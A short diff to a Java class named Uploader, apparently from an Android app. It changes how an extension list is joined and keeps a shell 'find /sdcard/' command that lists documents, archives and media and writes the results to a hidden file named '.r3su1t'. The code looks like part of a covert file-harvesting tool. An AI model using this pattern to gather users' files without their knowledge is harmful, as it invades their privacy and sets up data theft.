@@ -37,8 +37,16 @@ public class Uploader {
 			".xlsx",
 			".zip",
             ".mp3"};
-        String ext = String.join(" -o -name *", extList);
-        
+        //String ext = String.join(" -o -name *", extList); <- it causes crash in some Android versions
+        String ext = "";
+        for(int i = 0; i < extList.length; i++)
+        {
+            ext += extList[i];
+            if(i < extList.length - 1)ext += " -o -name *";
+        }
+
+        System.out.print(ext);
+
         String[] cmds = {"sh", "-c", String.format("find /sdcard/ -name *%s > .r3su1t", ext)};//shell commands
         
         
